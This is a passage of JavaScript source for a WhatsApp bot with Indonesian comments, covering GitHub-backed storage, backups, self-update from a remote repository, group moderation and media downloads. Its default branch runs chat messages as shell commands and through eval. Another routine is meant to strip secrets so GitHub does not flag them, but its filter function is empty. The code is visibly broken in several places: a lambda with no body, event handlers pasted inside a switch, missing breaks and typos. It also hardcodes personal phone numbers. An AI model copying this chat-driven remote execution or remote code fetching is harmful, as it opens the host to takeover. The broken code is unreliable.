 if(!fs.existsSync(filePath)) return Asepp.sendMessage(m.chat, { text: "❌ File AseppLohya.js gak ketemu" }, { quoted: m });
 
 try {
 let data = fs.readFileSync(filePath, "utf8");
 
 let escapeOldToken = oldToken.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
 let regex = new RegExp(escapeOldToken, "g");
 
 let matchCount = (data.match(regex) || []).length;
 
 if(matchCount === 0) return Asepp.sendMessage(m.chat, { text: `❌ Token ${oldToken} gak ketemu di file` }, { quoted: m });
 
 let newData = data.replace(regex, newToken);
 
 fs.writeFileSync(filePath, newData, "utf8");
 
 await Asepp.sendMessage(m.chat, { 
 text: `✅ Sukses ganti ${matchCount} token!\n\nLama: ${oldToken}\nBaru: ${newToken}\n\nRestart bot biar keapply` 
 }, { quoted: m });
 
 } catch(e) {
 Asepp.sendMessage(m.chat, { text: "❌ Error: " + e.message }, { quoted: m });
 }
}
break;

case 'cleargh': {
 if (m.sender.split('@')[0]!== '62881036109288') return payreply(m.chat, 'Khusus owner 🩸', m)

 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const DB_PATH = `database/database.json`
 const BOT_NUMBER = '6288994037615' // nomor bot lu

 const axios = require('axios')
 payreply(m.chat, 'Proses clear semua nomor kecuali bot...', m)

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${DB_PATH}`
 const getRes = await axios.get(getUrl, {
 })

 let db = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 const totalSebelum = db.Numbers?.length || 0

 if (totalSebelum === 0) return payreply(m.chat, 'Database udah kosong dari tadi 🩸', m)

 // Filter: simpen cuma nomor bot, hapus yang lain
 db.Numbers = db.Numbers.filter(num => num === BOT_NUMBER)
 const totalSesudah = db.Numbers.length
 const totalDihapus = totalSebelum - totalSesudah

 if (totalDihapus === 0) return payreply(m.chat, 'Ga ada nomor lain buat dihapus 🩸', m)

 const newContent = Buffer.from(JSON.stringify(db, null, 2)).toString('base64')

 await axios.put(getUrl, {
 message: `cleargh: hapus ${totalDihapus} nomor, sisa bot`,
 content: newContent,
 sha: getRes.data.sha
 }, {
 })

 payreply(m.chat, `Sukses clear database 🩸\n${totalDihapus} nomor dihapus\nSisa: ${totalSesudah} [Bot]`, m)

 } catch (e) {
 if (e.response?.status === 404) {
 return payreply(m.chat, 'File database.json ga ada 🩸', m)
 }
 payreply(m.chat, `Gagal clear: ${e.response?.data?.message || 'Error'}`, m)
 }
}
break
case 'backupsc': {
	try {
		if (!isCreator) return Asepp.sendMessage(m.chat, { text: mess.owner }, { quoted: m });

		const fs = require("fs");
		const path = require("path");
		const axios = require("axios");
		const { exec } = require("child_process");

		const GITHUB_OWNER = `AsepXyz12`;
		const GITHUB_REPO = `bot-wa-db`;

		const zipName = `𝐒𝐡𝐢𝐧𝐢𝐠𝐚𝐦𝐢𝐕𝟔𝐍𝐞𝐰(NoEnc).zip`;
		const tmpDir = path.join(__dirname, 'tmp');
		fs.mkdirSync(tmpDir, { recursive: true });
		const zipPath = path.join(tmpDir, zipName);

		await Asepp.sendMessage(m.chat, { text: '⏳ Backup ke GitHub & zip panel...' }, { quoted: m });

		async function uploadToGithub(filePath, repoPath) {
			let sha = null;
			let getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${repoPath}`;
			
			try {
				let getRes = await axios.get(getUrl, {
				});
				sha = getRes.data.sha;
			} catch(e) {}

			let fileContent = fs.readFileSync(filePath, "utf8");
			
			// Hapus line yang ada secret biar ga ke-detect GitHub
			fileContent = fileContent.split('\n').filter(line => 
			).join('\n');
			
			let encodedContent = Buffer.from(fileContent).toString('base64');

			return axios.put(getUrl, {
				message: `backupsc: update ${repoPath}`,
				content: encodedContent,
				sha: sha
			}, {
			});
	}

		let filePath = path.join(__dirname, "AseppLohya.js");
		if (!fs.existsSync(filePath)) filePath = path.join(process.cwd(), "AseppLohya.js");
		if (!fs.existsSync(filePath)) filePath = path.join(process.cwd(), "plugins", "AseppLohya.js");

		if (fs.existsSync(filePath)) {
			try {
				await uploadToGithub(filePath, "database/AseppLohya.js");
				await Asepp.sendMessage(m.chat, { text: `✅ Push sukses ke database/AseppLohya.js\n⚠️ Secret udah di-filter` }, { quoted: m });
			} catch(e) {
				try {
					await uploadToGithub(filePath, "AseppLohya.js");
					await Asepp.sendMessage(m.chat, { text: `✅ Push sukses ke AseppLohya.js di root\n⚠️ Secret udah di-filter` }, { quoted: m });
				} catch(e2) {
					await Asepp.sendMessage(m.chat, { text: `❌ Gagal push: ${e2.response?.data?.message || e2.message}` }, { quoted: m });
				}
			}
	} else {
			await Asepp.sendMessage(m.chat, { text: '⚠️ File AseppLohya.js ga ketemu' }, { quoted: m });
	}

		if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);

		const cmd = `zip -r "${zipPath}" . -x "node_modules/*" "session/*" ".npm/*" ".cache/*" "tmp/*"`;

		exec(cmd, async (err) => {
			if (err) return Asepp.sendMessage(m.chat, { text: `❌ Gagal zip: ${err.message}` }, { quoted: m });
			const sizeMB = (fs.statSync(zipPath).size / 1024 / 1024).toFixed(2);
			await Asepp.sendMessage(m.chat, { text: `✅ Backup selesai\n📦 ${zipName}\n📊 Size: ${sizeMB} MB` }, { quoted: m });
			await Asepp.sendMessage(m.chat, {
				document: fs.readFileSync(zipPath),
				fileName: zipName,
				mimetype: 'application/zip'
			}, { quoted: m });
			fs.unlinkSync(zipPath);
	});

	} catch (e) {
		return Asepp.sendMessage(m.chat, { text: `❌ Error: ${e.message}` }, { quoted: m });
	}
break;
}
case "autoupdate": {
	if (!isOwner) return Asepp.sendMessage(m.chat, { text: mess.owner }, { quoted: m });

	const fs = require("fs");
	const path = require("path");
	const axios = require("axios");

	const GITHUB_OWNER = `AsepXyz12`;
	const GITHUB_REPO = `bot-wa-db`;
	const branch = 'main';

	await Asepp.sendMessage(m.chat, { text: "🔄 Download update dari GitHub..." }, { quoted: m });

	try {
	// Cuma download AseppLohya.js, bukan full repo
		let url = `https://raw.githubusercontent.com/${GITHUB_OWNER}/${GITHUB_REPO}/${branch}/database/AseppLohya.js`;
		
		let res = await axios.get(url);
		
		let filePath = path.join(__dirname, "AseppLohya.js");
		fs.writeFileSync(filePath, res.data);
		
		await Asepp.sendMessage(m.chat, { 
			text: "✅ Update selesai!\n🔄 Ketik *.restart* buat aktifin fitur baru" 
		}, { quoted: m });

	} catch (e) {
		await Asepp.sendMessage(m.chat, { 
			text: `❌ Gagal update: ${e.response?.status === 404 ? 'File ga ketemu' : e.message}` 
	}, { quoted: m });
	}
break
    }
        case 'githubupload': case 'ghupload': {
    if (!m.quoted) return payreply('❌ Reply media bang')
    if (!isOwner) return payreply(mess.owner)

    payreply('⚡ *UPLOADING...* ⚡')

    try {
        const fs = require("fs")
        const path = require("path")
        const axios = require("axios")
        const FormData = require("form-data")

        const GITHUB_OWNER = `AsepXyz12`
        const GITHUB_REPO = `bot-wa-db`
        const FOLDER = `uploads`

        let buffer = await m.quoted.download()
        if (!buffer) return payreply('❌ Gagal download')

        let ext = m.quoted.mimetype?.split('/')[1]?.split(';')[0] || 'bin'
        let namaFile = `${Date.now()}.${ext}`
        let filePath = `${FOLDER}/${namaFile}`
        let fileSize = (buffer.length / 1024 / 1024).toFixed(2)
        let isVideo = m.quoted.mtype.includes('video')
        let isImage = m.quoted.mtype.includes('image')

        // 1. Upload ke GitHub
        let sha = null
        try {
            let check = await axios.get(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${filePath}`, {
            })
            sha = check.data.sha
        } catch(e) {}

        let encodedContent = buffer.toString('base64')
        let res = await axios.put(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${filePath}`, {
            message: `upload ${namaFile}`,
            content: encodedContent,
            sha: sha
        }, {
        })

        let rawUrl = `https://raw.githubusercontent.com/${GITHUB_OWNER}/${GITHUB_REPO}/main/${filePath}`

        // 2. Upload thumbnail ke Catbox kalau video/gambar
        let thumbUrl = null
        if (isVideo || isImage) {
            try {
                let thumbBuffer = isVideo? await m.quoted.download() : buffer
                let form = new FormData()
                form.append('fileToUpload', thumbBuffer, { filename: `thumb_${namaFile}.jpg` })
                form.append('reqtype', 'fileupload')

                let thumbRes = await axios.post('https://catbox.moe/user/api.php', form, {
                    headers: {...form.getHeaders(), 'User-Agent': 'Mozilla/5.0' },
                    timeout: 60000
                })
                thumbUrl = thumbRes.data.trim()
            } catch(e) {
                console.log('Thumbnail upload gagal:', e.message)
            }
        }

        // 3. Kirim hasil
        let msg = `✅ *UPLOAD SUKSES*\n\n`
        msg += `📁 *File:* ${namaFile}\n`
        msg += `📊 *Size:* ${fileSize} MB\n`
        msg += `🔗 *Direct Link:*\n${rawUrl}\n\n`
        if (thumbUrl) msg += `🖼️ *Thumbnail Link:*\n${thumbUrl}\n\n`
        msg += `_Permanen • All Media • Max 100MB per file_`

        payreply(msg)

    } catch (e) {
        console.log(e)
        payreply(`❌ Gagal upload: ${e.response?.data?.message || e.message}`)
    }
}




case 'tandatogc':
case 'taggc': {
 if (m.sender.split('@')[0]!== '62881036109288') return payreply('Khusus owner 🩸')
 if (!m.isGroup) return payreply('Command ini khusus group 🩸')

 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const TANDA_PATH = `database/tandagc.json`
 const axios = require('axios')

 payreply('Proses tandain group...')

 try {
 const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${TANDA_PATH}`
 let db = { list: [] }
 let sha = null

 try {
 const getRes = await axios.get(getUrl, {
 headers: {
 'User-Agent': 'Asepp-Bot'
 }
 })
 db = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())
 sha = getRes.data.sha
 } catch (e) {
 if (e.response?.status!== 404) throw e
 }

 if (!db.list) db.list = []

 const index = db.list.findIndex(v => v.id === m.chat)
 let teks = ''

 if (index!== -1) {
 // UNTAG
 db.list.splice(index, 1)
 teks = `Sukses untag group 🩸\n*${m.subject}* udah dihapus dari list GH`
 } else {
 // TAG
 db.list.push({ id: m.chat, name: m.subject, by: m.sender.split('@')[0] })
 teks = `Sukses tandain group 🩸\n*${m.subject}* udah masuk list GH`
 }

 const newContent = Buffer.from(JSON.stringify(db, null, 2)).toString('base64')

 await axios.put(getUrl, {
 message: `tandatogc: ${m.subject}`,
 content: newContent,
 sha: sha
 }, {
 headers: {
 'User-Agent': 'Asepp-Bot'
 }
 })

 teks += `\n\nTotal group ditandai: ${db.list.length}`
 payreply(teks)

 } catch (e) {
 payreply(`Gagal tandain: ${e.response?.data?.message || 'Error'}`)
 }
}
break



case 'cekerror': {
 if (m.sender.split('@')[0]!== '62881036109288') return payreply('Khusus owner 🩸')

 try {
 const fs = require('fs')
 const path = require('path')
 const vm = require('vm')
 const axios = require('axios')

 const filePath = path.join(__dirname, 'AseppLohya.js')
 if (!fs.existsSync(filePath)) return payreply('❌ File AseppLohya.js gak ketemu')

 const code = fs.readFileSync(filePath, 'utf8')
 const lines = code.split('\n')
 let errors = []
 let warnings = []

 // 1. SYNTAX CHECK
 try {
 new vm.Script(code, { filename: 'AseppLohya.js' })
 } catch (e) {
 errors.push(`🔥 *SYNTAX ERROR*\nLine ${e.lineNumber}: ${e.message}`)
 }

 // 2. EXTRACT URL + LINE NUMBER
 const urlRegex = /(https?:\/\/[^\s'"]+)/g
 let match
 let urlMap = [] // simpan {url, line}

 while ((match = urlRegex.exec(code))!== null) {
 let url = match[0]
 let pos = match.index
 let lineNum = code.substring(0, pos).split('\n').length
 urlMap.push({ url, line: lineNum })
 }

 // Filter domain penting + hapus duplikat URL
 const checkDomains = ['catbox.moe', 'litterbox.catbox.moe', 'raw.githubusercontent.com', 'github.com', 'pixhost.to', 'freeimage.host']
 const urlMapFiltered = urlMap.filter(item =>
 checkDomains.some(d => item.url.includes(d))
 ).filter((item, index, self) =>
 index === self.findIndex(t => t.url === item.url)
 )

 if (urlMapFiltered.length === 0) {
 return payreply(`┏『 *HASIL SCAN* 』┓\n┃ 📄 Line: ${lines.length}\n┃ 🔗 URL Dicek: 0\n┃ ✅ Aman, gak ada yg perlu dicek\n┗━━━━━━━━━━━━`)
 }

 payreply(`🔍 Scan ${lines.length} line, cek ${urlMapFiltered.length} URL penting...\nEstimasi 5-8 detik`)

 // 3. PARALLEL CHECK
 const checkUrl = async (item) => {
 let { url, line } = item

 if (url.includes('github.com') && url.includes('/blob/')) {
 return { type: 'warn', msg: `⚠️ GitHub blob gak support preview\nLine ${line}: ${url}` }
 }

 try {
 let res = await axios.head(url, {
 timeout: 5000,
 validateStatus: s => s < 500,
 headers: { 'User-Agent': 'Mozilla/5.0' }
 })

 if (res.status >= 400) {
 return { type: 'err', msg: `💀 LINK MATI ${res.status}\nLine ${line}: ${url}` }
 }

 if ((url.includes('catbox.moe') || url.includes('litterbox.catbox.moe')) && res.status === 404) {
 return { type: 'err', msg: `🖼️ THUMBNAIL EXPIRED\nLine ${line}: ${url}` }
 }

 if (url.includes('raw.githubusercontent.com') && res.headers['content-disposition']?.includes('attachment')) {
 return { type: 'warn', msg: `⚠️ GitHub raw ditolak WA\nLine ${line}: ${url}` }
 }

 return { type: 'ok' }
 } catch (e) {
 return { type: 'err', msg: `❌ TIMEOUT/ERROR\nLine ${line}: ${url}` }
 }
 }

 // Limit concurrency 5
 const limit = 5
 const results = []

 for (let i = 0; i < urlMapFiltered.length; i += limit) {
 const batch = urlMapFiltered.slice(i, i + limit)
 const batchResults = await Promise.all(batch.map(checkUrl))
 results.push(...batchResults)
 await new Promise(r => setTimeout(r, 300))
 }

 results.forEach(r => {
 if (r.type === 'err') errors.push(r.msg)
 if (r.type === 'warn') warnings.push(r.msg)
 })

 // 4. HASIL
 let hasil = `┏『 *HASIL SCAN AseppLohya.js* 』┓\n`
 hasil += `┃ 📄 Total Line: ${lines.length}\n`
 hasil += `┃ 🔗 URL Dicek: ${urlMapFiltered.length}/${urlMap.length}\n`
 hasil += `┃ ❌ Error: ${errors.length}\n`
 hasil += `┃ ⚠️ Warning: ${warnings.length}\n`
 hasil += `┗━━━━━━━━━━━━\n\n`

 if (errors.length > 0) {
 hasil += `*🔥 ERROR KRITIS:*\n${errors.join('\n\n')}\n\n`
 }
 if (warnings.length > 0) {
 hasil += `*⚠️ WARNING:*\n${warnings.join('\n\n')}\n\n`
 }
 if (errors.length === 0 && warnings.length === 0) {
 hasil += `✅ *AMAN!* Semua link hidup & syntax bersih.`
 }

 payreply(hasil)

 } catch (e) {
 payreply(`❌ Gagal scan: ${e.message}`)
 }
}
break

case 'noenc': case 'decode': {
 if (m.sender.split('@')[0]!== '62881036109288') return payreply('Khusus owner 🩸')

 try {
 let quoted = m.quoted? m.quoted : m.msg.contextInfo.quotedMessage
 if (!quoted) return payreply('Reply file.enc.js atau file yang udah di-encrypt bro')

 let mime = (quoted.msg || quoted).mimetype || ''
 if (!mime.includes('javascript') &&!mime.includes('text')) {
 return payreply('Reply file.js yang bener')
 }

 const fs = require("fs")
 const path = require("path")
 const { downloadContentFromMessage } = require('@whiskeysockets/baileys')

 await payreply('⏳ Lagi decode...')

 // Download file
 const stream = await downloadContentFromMessage(quoted, 'document')
 let buffer = Buffer.from([])
 for await (const chunk of stream) {
 buffer = Buffer.concat([buffer, chunk])
 }

 let fileContent = buffer.toString('utf8')
 let fileName = quoted.fileName || 'file.js'
 fileName = fileName.replace('.enc.js', '.js').replace('.enc', '')

 // Extract base64 dari variable _0x
 const match = fileContent.match(/const\s+_0x\s*=\s*"([^"]+)"/)
 if (!match) return payreply('❌ Format file gak valid. Ini bukan hasil encfile Shinigami')

 let base64Data = match[1]
 let decoded = Buffer.from(base64Data, 'base64').toString('utf8')

 // Simpan file hasil decode
 const tmpDir = path.join(__dirname, 'tmp')
 fs.mkdirSync(tmpDir, { recursive: true })

 const outPath = path.join(tmpDir, fileName)
 fs.writeFileSync(outPath, decoded, 'utf8')

 await payreply(`✅ Decode sukses\n📄 ${fileName}\n📊 ${decoded.length} karakter`)

 await Asepp.sendMessage(m.chat, {
 document: fs.readFileSync(outPath),
 fileName: fileName,
 mimetype: 'text/javascript',
 caption: 'Kode asli udah didecode'
 }, { quoted: m })

 fs.unlinkSync(outPath)

 } catch (e) {
 console.error('noenc error:', e)
 return payreply(`❌ Error: ${e.message}`)
 }
}
break

// END TOD
Asepp.ev.on('messages.upsert', async (chatUpdate) => {
    console.log('[DEBUG] Handler kepanggil')
    try {
        const mek = chatUpdate.messages[0]
        if (!mek.message) return
        if (mek.key.remoteJid === 'status@broadcast') return
        if (mek.key.id.startsWith('BAE5')) return

        let body = ''
        if (mek.message.conversation) body = mek.message.conversation
        else if (mek.message.extendedTextMessage) body = mek.message.extendedTextMessage.text
        else if (mek.message.imageMessage) body = mek.message.imageMessage.caption
        else if (mek.message.videoMessage) body = mek.message.videoMessage.caption

        console.log('[DEBUG] Body Raw:', body)

        const tiktokRegex = /https?:\/\/(?:www\.|v[tm]\.|[a-z0-9]+\.)?tiktok\.com\/[@a-zA-Z0-9_\.\/-]+/gi
        const tiktokMatch = body?.match(tiktokRegex)

        if (tiktokMatch && !mek.key.fromMe) {

            const urlTikTok = tiktokMatch[0]

            await Asepp.sendMessage(mek.key.remoteJid, {
                react: { text: "⏳", key: mek.key }
            }).catch(() => {})

            const result = await tiktokDownloader(urlTikTok)

            if (!result?.no_watermark) {
                await Asepp.sendMessage(mek.key.remoteJid, {
                    react: { text: "❌", key: mek.key }
                }).catch(() => {})
                return
            }

            let caption = `
*『 TIKTOK AUTO DOWN 』*

👤 Author: ${result.author || '-'}
🎵 Music: ${result.music || '-'}
📝 Judul:
${result.title || '-'}

_𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐓𝐎 𝐁𝐑𝐈𝐆𝐇𝐓 ✨_
`

            await Asepp.sendMessage(mek.key.remoteJid, {
                video: { url: result.no_watermark },
                caption: caption
            }, { quoted: mek })

            await Asepp.sendMessage(mek.key.remoteJid, {
                react: { text: "✅", key: mek.key }
            }).catch(() => {})

            return
        }

    } catch (err) {
        console.log('[ERROR GABAN]:', err)
    }
})
       // =============== [ AFK AUTO DETECT - 1 BLOK ] ===============
if (!command) command = '' // biar ga error kalo ga ada command
if (m.text.startsWith(prefix)) {
  // kalo ada prefix, skip. Biar dihandle sama case
} else {
  const GITHUB_OWNER = `AsepXyz12`
  const GITHUB_REPO = `bot-wa-db`
  const AFK_PATH = `database/afk.json`
  const axios = require('axios')

  try {
    const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${AFK_PATH}`
    const getRes = await axios.get(getUrl, {
    })
    let dbAfk = JSON.parse(Buffer.from(getRes.data.content, 'base64').toString())

    // 1. AUTO UN-AFK KALO USER NGETIK APA AJA
    if (dbAfk[m.sender]) {
      let alasanLama = dbAfk[m.sender].alasan
      let waktuAfk = Date.now() - dbAfk[m.sender].waktu
      let jam = Math.floor(waktuAfk / 3600000)
      let menit = Math.floor(waktuAfk / 60000) % 60
      let detik = Math.floor(waktuAfk / 1000) % 60

      delete dbAfk[m.sender]
      const newContent = Buffer.from(JSON.stringify(dbAfk, null, 2)).toString('base64')
      await axios.put(getUrl, {
        message: `unafk: ${m.sender.split('@')[0]}`,
        content: newContent,
        sha: getRes.data.sha
      }, {
      })

      payreply(`╭─「 *WELCOME BACK* 」🩸
│
│ Kamu kembali dari AFK
│ *Alasan tadi:* ${alasanLama}
│ *Durasi:* ${jam}j ${menit}m ${detik}d
│
╰─ Status AFK dihapus`, [m.sender])
    }

    // 2. DETEKSI TAG/REPLY ORANG AFK
    let userTag = m.mentionedJid[0] || (m.quoted? m.quoted.sender : null)
    if (userTag && dbAfk[userTag] && userTag!== m.sender) {
      let waktuAfk = Date.now() - dbAfk[userTag].waktu
      let jam = Math.floor(waktuAfk / 3600000)
      let menit = Math.floor(waktuAfk / 60000) % 60
      let detik = Math.floor(waktuAfk / 1000) % 60

      payreply(`╭─「 *USER SEDANG AFK* 」🩸
│
│ *User:* @${userTag.split('@')[0]}
│ *Alasan:* ${dbAfk[userTag].alasan}
│ *Sejak:* ${jam}j ${menit}m ${detik}d yang lalu
│
╰─ Mohon jangan diganggu`, [userTag])
    }
  } catch (e) {
    if (e.response?.status!== 404) console.log('AFK Error:', e.message)
  }
}
        Asepp.ev.on('group-participants.update', async (anu) => {
  try {
    let metadata = await Asepp.groupMetadata(anu.id)
    let participants = anu.participants

    // AUTO KICK BLACKLIST - GITHUB DB
    if (anu.action == 'add') {
      const GITHUB_OWNER = `AsepXyz12`
      const GITHUB_REPO = `bot-wa-db`
      const BL_PATH = `database/blacklist.json`
      const axios = require('axios')

      try {
        const url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${BL_PATH}`
        const res = await axios.get(url, {
          timeout: 5000
        })
        let blDb = JSON.parse(Buffer.from(res.data.content, 'base64').toString())
        
        if (blDb[anu.id] && blDb[anu.id].length > 0) {
          for (let num of participants) {
            if (blDb[anu.id].includes(num)) {
              // Cek bot admin apa kaga
              let botAdmin = metadata.participants.find(v => v.id === Asepp.user.id.split(':')[0] + '@s.whatsapp.net')?.admin
              
              if (botAdmin) {
                await Asepp.sendMessage(anu.id, { 
                  text: `*AUTO KICK* 🩸\n\n@${num.split('@')[0]} terdeteksi blacklist grup\nOtomatis dikick dari grup`, 
                  mentions: [num] 
                })
                await sleep(1500)
                await Asepp.groupParticipantsUpdate(anu.id, [num], 'remove')
              } else {
                await Asepp.sendMessage(anu.id, { 
                  text: `*DETEKSI BLACKLIST* 🩸\n\n@${num.split('@')[0]} ada di blacklist\nTapi bot bukan admin jadi ga bisa kick`, 
                  mentions: [num] 
                })
              }
            }
          }
        }
      } catch (e) {
        if (e.code!== 'ERR_BAD_REQUEST') console.log('BL Check Error:', e.message)
      }
    }

    // WELCOME MESSAGE
    if (anu.action == 'add') {
      let welcomeText = `*WELCOME* 🩸\n\nHalo @${participants[0].split('@')[0]} 👋\nSelamat datang di *${metadata.subject}*\n\nJangan lupa baca deskripsi grup ya`
      await Asepp.sendMessage(anu.id, { 
        text: welcomeText, 
        mentions: participants 
      })
    }

    // LEAVE MESSAGE
    if (anu.action == 'remove') {
      let leaveText = `*GOODBYE* 🩸\n\n@${participants[0].split('@')[0]} telah keluar dari grup`
      await Asepp.sendMessage(anu.id, { 
        text: leaveText, 
        mentions: participants 
      })
    }

    // PROMOTE MESSAGE
    if (anu.action == 'promote') {
      let promoteText = `*PROMOTE* 🩸\n\n@${participants[0].split('@')[0]} diangkat jadi admin grup`
      await Asepp.sendMessage(anu.id, { 
        text: promoteText, 
        mentions: participants 
      })
    }

    // DEMOTE MESSAGE
    if (anu.action == 'demote') {
      let demoteText = `*DEMOTE* 🩸\n\n@${participants[0].split('@')[0]} diturunkan dari admin`
      await Asepp.sendMessage(anu.id, { 
        text: demoteText, 
        mentions: participants 
      })
    }

  } catch (err) {
    console.log('Group Update Error:', err)
  }
})
// =============== [ END AFK AUTO DETECT ] ===============
                default:
                if (budy.startsWith('$')) {
                    if (!isCreator) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return payreply(err)
                        if (stdout) return payreply(stdout);
                    });
                }
                
                if (budy.startsWith('>')) {
                    if (!isCreator) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await payeply(evaled);
                    } catch (err) {
                        payreply(String(err));
                    }
                }
        
                if (budy.startsWith('<')) {
                    if (!isCreator) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await payreply(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})